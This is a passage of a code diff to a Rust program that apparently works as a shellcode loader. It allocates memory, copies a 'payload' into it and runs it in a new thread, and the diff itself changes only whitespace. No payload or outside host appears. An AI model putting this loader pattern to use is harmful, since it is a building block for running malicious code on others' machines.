@@ -37,11 +37,11 @@ fn main(){
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
-    
-        if base_addr.is_null() { 
+
+        if base_addr.is_null() {
             println!("[-] Couldn't allocate memory to current proc.")
         }
-    
+
         // copy memory
         std::ptr::copy(payload.as_ptr() as  _, base_addr, payload.len());
 
@@ -74,9 +74,9 @@ fn main(){
         if h_thread == 0 {
             let error = GetLastError();
             println!("{}", error.to_string())
-        
+
         }
-        
+
         let status = WaitForSingleObject(h_thread, u32::MAX);
         if status != 0 {
             let error = GetLastError();
